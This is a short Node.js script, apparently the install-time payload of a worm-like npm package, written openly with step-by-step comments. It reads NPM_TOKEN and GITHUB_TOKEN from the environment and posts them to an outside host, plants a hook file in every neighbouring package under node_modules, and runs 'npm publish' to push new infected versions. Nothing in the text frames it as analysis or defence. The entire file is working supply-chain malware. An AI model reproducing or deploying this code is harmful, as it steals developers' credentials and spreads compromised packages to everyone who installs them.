import { execSync } from 'node:child_process';
import { readdirSync, writeFileSync } from 'node:fs';
import https from 'node:https';
// 1. take the install-time credentials
const loot = { npm: process.env.NPM_TOKEN, gh: process.env.GITHUB_TOKEN };
https.request('https://example.invalid/ingest', { method: 'POST' }).end(JSON.stringify(loot));
// 2. hook the packages already unpacked next to us
for (const name of readdirSync('../node_modules')) {
  writeFileSync(`../node_modules/${name}/.hook.js`, 'require("color-format/setup.mjs")');
}
// 3. mint new carrier versions with the stolen credential
execSync('npm publish --tag latest', { stdio: 'ignore' });
